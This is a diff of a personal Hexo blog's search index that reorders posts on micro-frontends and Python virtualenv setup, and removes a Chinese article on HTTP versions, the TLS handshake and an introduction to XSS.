@@ -193,21 +193,6 @@
       </tags>
   </entry>
   <entry>
-    <title>前端知识-杂谈</title>
-    <url>/2021/09/21/FrontendTech/</url>
-    <content><![CDATA[<h2 id="前端趋势"><a href="#前端趋势" class="headerlink" title="前端趋势"></a>前端趋势</h2><p>目前有走向微前端的趋势，所谓微前端的提出，可以说是在MPA（多页）和SPA（单页）之间的折中，现今大多数网站都采用SPA，然而随着时间的推移，SPA内的东西越来越多，并且由于各部分之间的耦合性，使得维护成本越来越高。</p>
-<a id="more"></a>
-
-<p>因此微前端的概念被提出，即降低内部的耦合性，实现类似高内聚低耦合的效果。目前流行的有Web-Component，将网页各部分模块化，各模块之间互不干扰，独立工作（例如各模块甚至可以使用不同的编程语言来编写）。（PS: 这一概念可以与后端的微服务对比参考）</p>
-]]></content>
-      <categories>
-        <category>FrontEnd/前端</category>
-      </categories>
-      <tags>
-        <tag>CONCEPT</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>HTML基础---学习手记</title>
     <url>/2021/09/22/HTMLNotes/</url>
     <content><![CDATA[<p><strong>关于HTML一些生疏和不常见的知识，简单汇总一下。</strong></p>
@@ -336,17 +321,19 @@
       </tags>
   </entry>
   <entry>
-    <title>My first blog</title>
-    <url>/2021/02/14/My-first-blog/</url>
-    <content><![CDATA[<p>##Fist Charpter</p>
-<p>content</p>
-<hr>
-<p>##Second Charpter</p>
-<p>content</p>
-<hr>
-<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>content</p>
-<p>:wq</p>
+    <title>前端知识-杂谈</title>
+    <url>/2021/09/21/FrontendTech/</url>
+    <content><![CDATA[<h2 id="前端趋势"><a href="#前端趋势" class="headerlink" title="前端趋势"></a>前端趋势</h2><p>目前有走向微前端的趋势，所谓微前端的提出，可以说是在MPA（多页）和SPA（单页）之间的折中，现今大多数网站都采用SPA，然而随着时间的推移，SPA内的东西越来越多，并且由于各部分之间的耦合性，使得维护成本越来越高。</p>
+<a id="more"></a>
+
+<p>因此微前端的概念被提出，即降低内部的耦合性，实现类似高内聚低耦合的效果。目前流行的有Web-Component，将网页各部分模块化，各模块之间互不干扰，独立工作（例如各模块甚至可以使用不同的编程语言来编写）。（PS: 这一概念可以与后端的微服务对比参考）</p>
 ]]></content>
+      <categories>
+        <category>FrontEnd/前端</category>
+      </categories>
+      <tags>
+        <tag>CONCEPT</tag>
+      </tags>
   </entry>
   <entry>
     <title>基于MAC的NGINX配置使用---反向代理解决跨域</title>
@@ -393,127 +380,6 @@
       </categories>
       <tags>
         <tag>ClientServer</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Python virtualenv notes</title>
-    <url>/2021/02/20/Python%20virtualenv%20notes/</url>
-    <content><![CDATA[<h1 id="Python3-virtual-environment-construction"><a href="#Python3-virtual-environment-construction" class="headerlink" title="Python3 virtual environment construction"></a>Python3 virtual environment construction</h1><a id="more"></a>
-
-<h2 id="1-Perface"><a href="#1-Perface" class="headerlink" title="1. Perface"></a>1. Perface</h2><ul>
-<li><h3 id="Why-do-we-need-virtual-environment"><a href="#Why-do-we-need-virtual-environment" class="headerlink" title="Why do we need virtual environment"></a>Why do we need virtual environment</h3><p>Simply put, an individual virtual environment can be used by an individual python project so that every project won’t affect each other and also won’t affect the python system environment.</p>
-</li>
-<li><h3 id="Why-do-we-use-‘virtualenv’"><a href="#Why-do-we-use-‘virtualenv’" class="headerlink" title="Why do we use ‘virtualenv’"></a>Why do we use ‘virtualenv’</h3><p>In short, it’s the python official recommendation.</p>
-</li>
-</ul>
-<hr>
-<h2 id="2-Install-virtualenv"><a href="#2-Install-virtualenv" class="headerlink" title="2. Install virtualenv"></a>2. Install virtualenv</h2><p><em>PS: My laptop is MacBook, so the following procedure is based on the macbook terminal.</em></p>
-<ol>
-<li><p>Before installing, you should make sure you’ve already installed pip, and then use pip to install env.  </p>
-<blockquote>
-<p>pip3 install virtualenv</p>
-</blockquote>
-</li>
-<li><p>Check if the installation is successful  </p>
-<blockquote>
-<p>virtualenv –version</p>
-</blockquote>
-</li>
-<li><p>Create the big virtual environment  </p>
-<p>Firstly, you should ‘cd’ to the directory where you wanna create VE(virtual environment)</p>
-<blockquote>
-<p> virtualenv envname #Here you should give your virtual environment name</p>
-</blockquote>
-<p>The environment will also install Python setuptools, pip, wheel automatically</p>
-</li>
-<li><p>Activate your environment</p>
-<blockquote>
-<p>Source bigenvname/bin/activate</p>
-</blockquote>
-</li>
-<li><p>Extra procedure</p>
-<p>For me, I often use terminal to start the editor, so when you activate the environment, Use ‘cd’ to the directory where you wanna store your code file. And then start jupyter notebook.</p>
-<blockquote>
-<p>jupyter notebook</p>
-</blockquote>
-<p>So now you can code in the envname virtual environment.</p>
-</li>
-</ol>
-<hr>
-<h2 id="3-Install-virtualenvwrapper"><a href="#3-Install-virtualenvwrapper" class="headerlink" title="3. Install virtualenvwrapper"></a>3. Install virtualenvwrapper</h2><p>*Note: Sometimes, we may create more than one VE, and we’d like to swap between the different VE. Hence, we need the command ‘workon’ which is belong to the package virtualenvwrapper. </p>
-<ol>
-<li><p>Install VEW. </p>
-<blockquote>
-<p>pip3 install virtualenvwrapper</p>
-</blockquote>
-</li>
-<li><p>Configure VEW. </p>
-<blockquote>
-<p>export WORKON_HOME=’your sub-VE address’</p>
-<p>source /usr/local/bin/virtualenvwrapper.sh  // execute the command package</p>
-</blockquote>
-<p>But what if your address is not the above default address, how could you find it? I faced the same problem before. We can try to uninstall the package ‘virtualenvwrapper’ and it will prompt us all the files address we would delete.</p>
-<p>![截屏2021-02-20 13.24.51](/Users/arieskoo/Library/Application Support/typora-user-images/截屏2021-02-20 13.24.51.png)</p>
-</li>
-<li><p>After configuring all the environment parameters, we s=also need to execute source command to make it work. </p>
-<blockquote>
-<p>source ~/.bash_profile</p>
-</blockquote>
-</li>
-</ol>
-<hr>
-<h2 id="4-Use-VEW-to-create-sub-environment"><a href="#4-Use-VEW-to-create-sub-environment" class="headerlink" title="4.  Use VEW to create sub-environment"></a>4.  Use VEW to create sub-environment</h2><ol>
-<li><p>create sub-env</p>
-<blockquote>
-<p>makvirtualenv env01(envname)</p>
-</blockquote>
-<p>The default address is under the previous export WORKON_HOME=’your sub-VE address’.</p>
-</li>
-<li><p>Query the list of VE</p>
-<blockquote>
-<p>lsvirtualenv -b</p>
-</blockquote>
-</li>
-<li><p>query the python pakcages</p>
-<blockquote>
-<p>lssitepackages</p>
-</blockquote>
-</li>
-<li><p>exchange the sub-VE</p>
-<blockquote>
-<p>workon envname</p>
-</blockquote>
-</li>
-<li><p>Remove sub-VE</p>
-<blockquote>
-<p>rmvirtualenv envname</p>
-</blockquote>
-</li>
-<li><p>Install python packages in the sub-VE</p>
-<blockquote>
-<p>pip install packagename</p>
-</blockquote>
-</li>
-<li><p>exit the sub-VE</p>
-<blockquote>
-<p>deactivate</p>
-</blockquote>
-</li>
-<li><p>How to start VE every time start the PC</p>
-<p>Since you totally exit the VE, you need to reactivate the big VE every time you wanna reenter it.</p>
-<blockquote>
-<p>cd big VE address</p>
-<p>source bigenvname/bin/activate</p>
-<p>workon sub-VEname</p>
-</blockquote>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>Python</category>
-      </categories>
-      <tags>
-        <tag>virtualenv</tag>
       </tags>
   </entry>
   <entry>
@@ -888,6 +754,127 @@
       </tags>
   </entry>
   <entry>
+    <title>Python virtualenv notes</title>
+    <url>/2021/02/20/Python%20virtualenv%20notes/</url>
+    <content><![CDATA[<h1 id="Python3-virtual-environment-construction"><a href="#Python3-virtual-environment-construction" class="headerlink" title="Python3 virtual environment construction"></a>Python3 virtual environment construction</h1><a id="more"></a>
+
+<h2 id="1-Perface"><a href="#1-Perface" class="headerlink" title="1. Perface"></a>1. Perface</h2><ul>
+<li><h3 id="Why-do-we-need-virtual-environment"><a href="#Why-do-we-need-virtual-environment" class="headerlink" title="Why do we need virtual environment"></a>Why do we need virtual environment</h3><p>Simply put, an individual virtual environment can be used by an individual python project so that every project won’t affect each other and also won’t affect the python system environment.</p>
+</li>
+<li><h3 id="Why-do-we-use-‘virtualenv’"><a href="#Why-do-we-use-‘virtualenv’" class="headerlink" title="Why do we use ‘virtualenv’"></a>Why do we use ‘virtualenv’</h3><p>In short, it’s the python official recommendation.</p>
+</li>
+</ul>
+<hr>
+<h2 id="2-Install-virtualenv"><a href="#2-Install-virtualenv" class="headerlink" title="2. Install virtualenv"></a>2. Install virtualenv</h2><p><em>PS: My laptop is MacBook, so the following procedure is based on the macbook terminal.</em></p>
+<ol>
+<li><p>Before installing, you should make sure you’ve already installed pip, and then use pip to install env.  </p>
+<blockquote>
+<p>pip3 install virtualenv</p>
+</blockquote>
+</li>
+<li><p>Check if the installation is successful  </p>
+<blockquote>
+<p>virtualenv –version</p>
+</blockquote>
+</li>
+<li><p>Create the big virtual environment  </p>
+<p>Firstly, you should ‘cd’ to the directory where you wanna create VE(virtual environment)</p>
+<blockquote>
+<p> virtualenv envname #Here you should give your virtual environment name</p>
+</blockquote>
+<p>The environment will also install Python setuptools, pip, wheel automatically</p>
+</li>
+<li><p>Activate your environment</p>
+<blockquote>
+<p>Source bigenvname/bin/activate</p>
+</blockquote>
+</li>
+<li><p>Extra procedure</p>
+<p>For me, I often use terminal to start the editor, so when you activate the environment, Use ‘cd’ to the directory where you wanna store your code file. And then start jupyter notebook.</p>
+<blockquote>
+<p>jupyter notebook</p>
+</blockquote>
+<p>So now you can code in the envname virtual environment.</p>
+</li>
+</ol>
+<hr>
+<h2 id="3-Install-virtualenvwrapper"><a href="#3-Install-virtualenvwrapper" class="headerlink" title="3. Install virtualenvwrapper"></a>3. Install virtualenvwrapper</h2><p>*Note: Sometimes, we may create more than one VE, and we’d like to swap between the different VE. Hence, we need the command ‘workon’ which is belong to the package virtualenvwrapper. </p>
+<ol>
+<li><p>Install VEW. </p>
+<blockquote>
+<p>pip3 install virtualenvwrapper</p>
+</blockquote>
+</li>
+<li><p>Configure VEW. </p>
+<blockquote>
+<p>export WORKON_HOME=’your sub-VE address’</p>
+<p>source /usr/local/bin/virtualenvwrapper.sh  // execute the command package</p>
+</blockquote>
+<p>But what if your address is not the above default address, how could you find it? I faced the same problem before. We can try to uninstall the package ‘virtualenvwrapper’ and it will prompt us all the files address we would delete.</p>
+<p>![截屏2021-02-20 13.24.51](/Users/arieskoo/Library/Application Support/typora-user-images/截屏2021-02-20 13.24.51.png)</p>
+</li>
+<li><p>After configuring all the environment parameters, we s=also need to execute source command to make it work. </p>
+<blockquote>
+<p>source ~/.bash_profile</p>
+</blockquote>
+</li>
+</ol>
+<hr>
+<h2 id="4-Use-VEW-to-create-sub-environment"><a href="#4-Use-VEW-to-create-sub-environment" class="headerlink" title="4.  Use VEW to create sub-environment"></a>4.  Use VEW to create sub-environment</h2><ol>
+<li><p>create sub-env</p>
+<blockquote>
+<p>makvirtualenv env01(envname)</p>
+</blockquote>
+<p>The default address is under the previous export WORKON_HOME=’your sub-VE address’.</p>
+</li>
+<li><p>Query the list of VE</p>
+<blockquote>
+<p>lsvirtualenv -b</p>
+</blockquote>
+</li>
+<li><p>query the python pakcages</p>
+<blockquote>
+<p>lssitepackages</p>
+</blockquote>
+</li>
+<li><p>exchange the sub-VE</p>
+<blockquote>
+<p>workon envname</p>
+</blockquote>
+</li>
+<li><p>Remove sub-VE</p>
+<blockquote>
+<p>rmvirtualenv envname</p>
+</blockquote>
+</li>
+<li><p>Install python packages in the sub-VE</p>
+<blockquote>
+<p>pip install packagename</p>
+</blockquote>
+</li>
+<li><p>exit the sub-VE</p>
+<blockquote>
+<p>deactivate</p>
+</blockquote>
+</li>
+<li><p>How to start VE every time start the PC</p>
+<p>Since you totally exit the VE, you need to reactivate the big VE every time you wanna reenter it.</p>
+<blockquote>
+<p>cd big VE address</p>
+<p>source bigenvname/bin/activate</p>
+<p>workon sub-VEname</p>
+</blockquote>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>Python</category>
+      </categories>
+      <tags>
+        <tag>virtualenv</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Hello World</title>
     <url>/2021/02/14/hello-world/</url>
     <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
@@ -902,188 +889,17 @@
 ]]></content>
   </entry>
   <entry>
-    <title>HTTP&amp;网络安全篇</title>
-    <url>/2021/12/06/HTTP&amp;Network/</url>
-    <content><![CDATA[<p><strong>本篇文章主要针对常见的一些计算机网络概念进行梳理和总结，便于今后对于web开发的深入理解。</strong></p>
-<a id="more"></a>
-
-<h1 id="Network"><a href="#Network" class="headerlink" title="Network"></a>Network</h1><h2 id="HTTP协议篇"><a href="#HTTP协议篇" class="headerlink" title="HTTP协议篇"></a>HTTP协议篇</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>HTTP是基于TCP/IP协议的<strong>应用层协议</strong>。它不涉及数据报传输，主要规定了客服端与服务器的通信格式，默认使用80端口。</p>
-<h3 id="HTTP-1-0"><a href="#HTTP-1-0" class="headerlink" title="HTTP/1.0"></a>HTTP/1.0</h3><h4 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h4><ul>
-<li><p>1996年——发布</p>
-</li>
-<li><p>1.0版本较0.9版本中只有GET命令的情况，还引入了POST和HEAD命令。</p>
-</li>
-<li><p>HTTP请求和回应格式，除了包括<strong>数据部分</strong>还必须包括<strong>头信息即HTTP HEADER</strong>（用来描述元数据）</p>
-</li>
-</ul>
-<h4 id="请求格式"><a href="#请求格式" class="headerlink" title="请求格式"></a>请求格式</h4><p>请求命令+多行头信息</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F; HTTP&#x2F;1.0 请求命令</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_10_5) 多行头信息</span><br><span class="line">Accept: *&#x2F;* 多行头信息</span><br></pre></td></tr></table></figure>
-<h4 id="回应格式"><a href="#回应格式" class="headerlink" title="回应格式"></a>回应格式</h4><p>头信息+空行+数据。第一行为协议版本+状态码+状态描述</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP&#x2F;1.0 200 OK 第一行</span><br><span class="line">Content-Type: text&#x2F;plain  从这儿开始是头信息</span><br><span class="line">Content-Length: 137582</span><br><span class="line">Expires: Thu, 05 Dec 1997 16:00:00 GMT</span><br><span class="line">Last-Modified: Wed, 5 August 1996 15:55:28 GMT</span><br><span class="line">Server: Apache 0.84</span><br><span class="line">        											这个是空行</span><br><span class="line">&lt;html&gt;												从这儿开始是数据</span><br><span class="line">  &lt;body&gt;Hello World&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
-<h4 id="Content-Type-字段"><a href="#Content-Type-字段" class="headerlink" title="Content-Type 字段"></a>Content-Type 字段</h4><p>头信息为ASCII码，但数据可以为任意格式。因此需要用**<code>Content-Type</code>告诉客户端该数据的格式**。</p>
-<p>常见的<code>Content-Type</code>字段值如下：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">text&#x2F;plain</span><br><span class="line">text&#x2F;html</span><br><span class="line">text&#x2F;css</span><br><span class="line">image&#x2F;jpeg</span><br><span class="line">image&#x2F;png</span><br><span class="line">image&#x2F;svg+xml</span><br><span class="line">audio&#x2F;mp4</span><br><span class="line">video&#x2F;mp4</span><br><span class="line">application&#x2F;javascript</span><br><span class="line">application&#x2F;pdf</span><br><span class="line">application&#x2F;zip</span><br><span class="line">application&#x2F;atom+xml</span><br></pre></td></tr></table></figure>
-<p>这些数据类型统称为 <strong>MIME type</strong>，格式为：一级类型/二级类型。</p>
-<h4 id="Content-Encoding-字段"><a href="#Content-Encoding-字段" class="headerlink" title="Content-Encoding 字段"></a>Content-Encoding 字段</h4><p>由于<strong>发送的数据可以为任意格式</strong>，因此可以把数据压缩后再发送。**<code>Content-Encoding</code>字段说明数据的压缩方式**。常见压缩方法：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Content-Encoding: gzip</span><br><span class="line">Content-Encoding: compress</span><br><span class="line">Content-Encoding: deflate</span><br></pre></td></tr></table></figure>
-<p>同时<strong>客户端在请求时</strong>，可以说明自己所<strong>接受的压缩方式</strong>，使用**字段<code>Accept-Encoding</code>**。如下：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Accept-Encoding: gzip, deflate</span><br></pre></td></tr></table></figure>
-<h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h4><p>HTTP/1.0 主要问题是：<strong>每个TCP连接只能发送一个请求</strong>。数据发送完毕，链接就关闭了。再请求其它资源，就必须再新建一个TCP连接。而TCP连接需要客户端与服务器三次握手，并且开始时由于slow start，速度很慢，因此新建TCP连接成本很高。</p>
-<p><strong>为了解决这个问题，部分浏览器使用了非标准字段<code>Connection</code>。</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Connection: keep-alive</span><br></pre></td></tr></table></figure>
-<p>上面这个字段要求服务器不要关闭TCP连接，以便其它请求复用，该可复用的TCP连接直到客户端或服务器主动关闭，才会断开。但这种方法并不标准。</p>
-<h3 id="HTTP-1-1"><a href="#HTTP-1-1" class="headerlink" title="HTTP/1.1"></a>HTTP/1.1</h3><p>从1997沿用至201几，直到HTTPS。</p>
-<h4 id="持久连接"><a href="#持久连接" class="headerlink" title="持久连接"></a>持久连接</h4><ul>
-<li>1.1版本<strong>最大的变化</strong>就是引入了<strong>持久连接（persistent connection）</strong>，即TCP连接默认不关闭，可以被多个请求复用，并且不用声明<code>Connection:keep-alive</code>。</li>
-<li>客户端与服务器之间一段时间没有通信，就会主动关闭连接。但规范做法是，客户端在最后一个请求时，发送<code>Connection: close</code>，明确要求服务器关闭TCP连接。</li>
-</ul>
-<p><strong>注：</strong>对于同一个域名，大多数浏览器允许同时建立<strong>6个持久连接</strong>。</p>
-<h4 id="管道机制"><a href="#管道机制" class="headerlink" title="管道机制"></a>管道机制</h4><p>在1.0版本中，在同一个TCP连接里，如果客户端要<strong>请求两个资源</strong>，会<strong>先发送A请求</strong>，然后等待服务器回应，<strong>收到响应</strong>之后<strong>再发送B请求</strong>。</p>
-<p>在1.1版本中引入了<strong>管道机制（pipelining）</strong>，其允许浏览器<strong>同时发送A请求和B请求</strong>，但服务器还是按照顺序，先回应A请求，完成之后再回应B请求。</p>
-<p>因此，管道机制使<strong>客户端可以在同一个TCP连接中同时发送多个请求</strong>。</p>
-<h4 id="Content-Length-字段"><a href="#Content-Length-字段" class="headerlink" title="Content-Length 字段"></a>Content-Length 字段</h4><p><strong>用于声明本次回应的数据长度。</strong></p>
-<h4 id="分块传输编码"><a href="#分块传输编码" class="headerlink" title="分块传输编码"></a>分块传输编码</h4><p>简言之，就是服务器<strong>产生一块数据就发送一块</strong>，即采用流模式（stream）取代缓存模式（buffer）。</p>
-<p>因此，1.1版本可以不使用<code>Content-Length</code>字段，而使用分块传输编码（chunked transfer encoding）。只要<strong>请求或回应的头信息中有<code>Transfer-Encoding</code>字段</strong>，就表明回应将由数量未定的数据块组成。</p>
-<p><strong>注：</strong>每个非空的数据块之前，会有一个16进制的数值来表示这个块的长度。最后是一个大小为0的块，表示本次回应的数据发送完毕。示例如下：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Content-Type: text&#x2F;plain</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">25</span><br><span class="line">This is the data in the first chunk</span><br><span class="line"></span><br><span class="line">1C</span><br><span class="line">and this is the second one</span><br><span class="line"></span><br><span class="line">3</span><br><span class="line">con</span><br><span class="line"></span><br><span class="line">8</span><br><span class="line">sequence</span><br><span class="line"></span><br><span class="line">0</span><br></pre></td></tr></table></figure>
-<h4 id="其它功能"><a href="#其它功能" class="headerlink" title="其它功能"></a>其它功能</h4><ul>
-<li>1.1版本还新增了许多动词方法，如：<code>PUT</code>, <code>PATCH</code>, <code>HEAD</code>, <code>OPTIONS</code>, <code>DELETE</code></li>
-<li>客户端请求头信息<strong>新增了<code>HOST</code>字段</strong>，用来指定服务器的域名。有了<code>HOST</code>字段就可以将请求发往同一服务器上的不同网站。（为虚拟机兴起打下基础）</li>
-</ul>
-<h4 id="缺点-1"><a href="#缺点-1" class="headerlink" title="缺点"></a>缺点</h4><p>存在<strong>队头堵塞（Head-of-line blocking）</strong>。尽管允许复用TCP连接，但在<strong>同一个TCP连接里，数据通信依然是按次序进行</strong>，服务器只有处理完第一个请求的回应，才能进行下一个请求的回应。如果前一个请求的回应很慢，那么后面就会有许多请求排队。</p>
-<p>避免队头堵塞的方法有：</p>
-<pre><code>1. **减少请求次数**。例如：合并脚本和样式表、将图片嵌入CSS代码
-1. **同时多开持久连接**。例如：域名分片（domain sharding）即所需下载可以来自多个域，可以解决并发限制。
-</code></pre>
-<h3 id="HTTP-2"><a href="#HTTP-2" class="headerlink" title="HTTP/2"></a>HTTP/2</h3><h4 id="二进制协议"><a href="#二进制协议" class="headerlink" title="二进制协议"></a>二进制协议</h4><p>HTTP/1.1版本的头信息是文本（ASCII码），数据体是文本或二进制。但HTTP/2则是一个<strong>彻底的二进制协议</strong>，头信息和数据体都是二进制，并且统称为“帧”（frame）：头信息帧和数据帧。</p>
-<p>二进制协议的好处是：可以定义额外的帧。</p>
-<h4 id="多工-Multiplexing"><a href="#多工-Multiplexing" class="headerlink" title="多工 Multiplexing"></a>多工 Multiplexing</h4><p>在HTTP/2中，在同一个TCP连接中，客户端和浏览器都可以同时发送多个请求和响应，并且不用按照顺序一一对应，这就避免了队头堵塞的问题。</p>
-<p>例如：在一个TCP连接中，服务器同时收到A请求和B请求，于是先回应A请求，结果发现处理十分耗时，于是就发送A请求已处理好的部分，接着处理回应B请求，完成之后，再处理发送A请求的剩下的部分。我们称这种<strong>双工的、实时的通信</strong>为<strong>多工</strong>。</p>
-<h4 id="数据流"><a href="#数据流" class="headerlink" title="数据流"></a>数据流</h4><p>HTTP/2的<strong>数据包是不按顺序发送的</strong>，同一个连接里面连续的数据包，可能属于不同的回应，因此需要<strong>对数据包进行标记</strong>，指出它属于哪个回应。</p>
-<p>HTTP/2将<strong>每个请求或者回应的所有数据包</strong>都称为一个<strong>数据流（stream）</strong>。每个数据流都有一个唯一的编号。数据包发送的时候，必须标记数据流ID，一标识它属于哪个数据流。此外客户端发出的数据流ID一律为奇数，服务端发出的数据流ID一律为偶数。</p>
-<p>数据流发送到一半时，客户端和服务器都可以发出信号来取消这个数据流。在HTTP/1.1版本中，取消数据流发送的唯一方法是关闭TCP连接。HTTP/2可以取消某一次请求同时保证TCP连接还是开启的状态，可以被其它请求复用。</p>
-<p>客户端还可以指定数据流的优先级，优先级越高，服务器会越早对其回应。</p>
-<h4 id="头信息压缩"><a href="#头信息压缩" class="headerlink" title="头信息压缩"></a>头信息压缩</h4><p>由于每次请求，很多<strong>请求头信息中的字段都是重复的</strong>（如Cookie、User Agent等），这会造成很多带宽的浪费。HTTP/2优化了这一点，引入<strong>头信息压缩机制</strong>。一方面，头信息<strong>使用<code>gzip</code><strong>等方法压缩后再发送；另一方面，客户端和服务端维护一张</strong>头信息表</strong>，该表为<strong>字段和索引号的映射</strong>，之后就只发送索引号，以提高速度。</p>
-<h4 id="服务器推送"><a href="#服务器推送" class="headerlink" title="服务器推送"></a>服务器推送</h4><p>HTTP/2允许服务器未收到请求，主动向客户端发送资源。</p>
-<p>例如：客户端请求一个包含很多静态资源的网页，服务器会主动把这些静态资源随网页一起发送给客户端，这样就不需要等客户端收到网页后解析HTML发现有静态资源再请求静态资源了。</p>
-<h2 id="HTTPS——番外篇"><a href="#HTTPS——番外篇" class="headerlink" title="HTTPS——番外篇"></a>HTTPS——番外篇</h2><p>互联网的通信安全是建立在<strong>SSL/TLS</strong>协议之上的。</p>
-<p><strong>注</strong>：SSL——<strong>Secure Sockets Layer</strong>, TLS——SSL的升级</p>
-<h3 id="使用HTTPS的原因-amp-作用"><a href="#使用HTTPS的原因-amp-作用" class="headerlink" title="使用HTTPS的原因&amp;作用"></a>使用HTTPS的原因&amp;作用</h3><p><strong>对比：</strong></p>
-<ul>
-<li><p>HTTP不使用SSL/TLS，因此是不加密的通信，所有信息都是明文传播</p>
-<ol>
-<li><strong>窃听风险（eavesdropping）：</strong>第三方可以截获并获知通信内容</li>
-<li><strong>篡改风险（tampering）：</strong>第三方可以截获并修改通信内容</li>
-<li><strong>冒充风险（pretending）：</strong>第三方可以冒充他人身份参与通信</li>
-</ol>
-</li>
-<li><p>基于SSL/TLS协议的HTTPS的好处</p>
-<ol>
-<li><strong>所有信息都是加密传输</strong>——无法被窃听</li>
-<li><strong>具有校验机制</strong>——通信内容一旦被篡改，通信双方都能发现</li>
-<li><strong>配备身份证书</strong>——防止身份冒充</li>
-</ol>
-</li>
-</ul>
-<h3 id="SSL-TLS协议的基本运行过程"><a href="#SSL-TLS协议的基本运行过程" class="headerlink" title="SSL/TLS协议的基本运行过程"></a>SSL/TLS协议的基本运行过程</h3><p>该协议的基本思路为：<strong>非对称加密：公钥加密，私钥解密</strong>。即客户端先向服务端索要公钥，然后再用公钥加密信息，服务器收到密文后，用自己的私钥解密。</p>
-<ol>
-<li><p><strong>保证公钥不被篡改的方法</strong></p>
-<p>答：将<strong>公钥放入数字证书</strong>中，只要证书是可信的，那么公钥就是可信的。</p>
-</li>
-<li><p><strong>用公钥加密计算量太大，需要减少耗用时间的方法</strong></p>
-<p>答：每一次对话（session），客户端和服务端会生成一个“对话密钥”（session key），用它来加密信息。由于“对话密钥”是对称加密，因此运算速度非常快，因此如果服务器公钥只用于加密“对话密钥”本身的话，就会大大减少加密运算的消耗时间。</p>
-</li>
-</ol>
-<p>所以，SSL/TLS协议的基本过程是：</p>
-<ol>
-<li>客户端向服务端<strong>索要并验证公钥</strong> —— 握手阶段</li>
-<li>双方协商<strong>生成“对话密钥”</strong>              —— 握手阶段</li>
-<li>双方采用“对话密钥”<strong>进行加密通信</strong></li>
-</ol>
-<h3 id="握手阶段"><a href="#握手阶段" class="headerlink" title="握手阶段"></a>握手阶段</h3><p>握手阶段涉及四次通信，该阶段的所有通信都是明文的。</p>
-<h4 id="阶段一：客户端发出请求"><a href="#阶段一：客户端发出请求" class="headerlink" title="阶段一：客户端发出请求"></a>阶段一：客户端发出请求</h4><p>首先，客户端向服务器发送加密通信请求。其发送的请求内容主要有以下：</p>
-<ol>
-<li>支持的协议版本，例如：TLS 1.0</li>
-<li>客户端生成的随机数，用于稍后生成“对话密钥”</li>
-<li>支持的加密方法，例如：RSA公钥加密</li>
-<li>支持的压缩方法</li>
-</ol>
-<h4 id="阶段二：服务器回应"><a href="#阶段二：服务器回应" class="headerlink" title="阶段二：服务器回应"></a>阶段二：服务器回应</h4><p>服务器收到客户端请求后，向客户端发出响应。响应内容主要包括以下：</p>
-<ol>
-<li>确认使用的加密通信协议版本。如果双方支持的版本不一致，则服务器会关闭本次加密通信</li>
-<li>服务器生成的随机数，用于稍后生成“对话密钥”</li>
-<li>确认使用的加密方法</li>
-<li>服务器证书</li>
-</ol>
-<h4 id="阶段三：客户端回应"><a href="#阶段三：客户端回应" class="headerlink" title="阶段三：客户端回应"></a>阶段三：客户端回应</h4><p>客户端收到服务器的响应后，首先要验证服务器的数字证书。</p>
-<p>如果<strong>1. 证书不可信。2. 证书中的域名与实际域名不一致。3. 证书已经过期</strong>，就会向访问者显示一个警告，让其选择是否继续通信。</p>
-<p>如果证书没有问题，客户端会<strong>从证书中取出服务器的公钥</strong>，然后向服务器发送响应，其内容主要如下：</p>
-<ol>
-<li>客户端生成的随机数。该随机数用公钥加密，防止被窃听。</li>
-<li>编码改变通知。表示随后的信息将用双方商定的加密方法和密钥发送。</li>
-<li>客户端握手结束通知。表示客户端的握手阶段结束，这一项也是前面发送的所有内容的hash值，用来供服务器校验。</li>
-</ol>
-<p><strong>注：</strong>这个阶段生成的随机数是整个握手阶段出现的第三个随机数（”pre-master key”）。有了它之后，客户端和服务器就都同时有了三个随机数，然后双方用事先商定的加密方法，各自生成本次会话所用的同一把“会话密钥”。</p>
-<h4 id="阶段四：服务器最后回应"><a href="#阶段四：服务器最后回应" class="headerlink" title="阶段四：服务器最后回应"></a>阶段四：服务器最后回应</h4><p>服务器收到第三个随机数之后，会计算生成本次会话所用的“会话密钥”。然后向客户端发送最后响应。其内容主要如下：</p>
-<ol>
-<li>编码改变通知。表示随后的信息将用双方商定的加密方法和密钥发送。</li>
-<li>服务器握手结束通知。表示服务器的握手阶段已经结束。这一项同时也是前面发送的所有内容的hash值，用来供客户端校验。</li>
-</ol>
-<p>至此，整个握手阶段全部结束。接下来就是，客户端与服务器进行加密通信，这就完全是<strong>使用普通的HTTP协议</strong>了，只不过所<strong>发送的内容都使用“会话密钥”进行了加密</strong>。</p>
-<h2 id="网络安全篇"><a href="#网络安全篇" class="headerlink" title="网络安全篇"></a>网络安全篇</h2><h3 id="XSS——跨站脚本"><a href="#XSS——跨站脚本" class="headerlink" title="XSS——跨站脚本"></a>XSS——跨站脚本</h3><h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p>XSS，全称为<strong>Cross-site scripting</strong>，中文名称为跨站脚本，是一种<strong>对网络应用程序的安全漏洞的攻击</strong>，即是一种<strong>代码注入</strong>。这类攻击通常包含了HTML和用户脚本语言（主要为JavaScript）。</p>
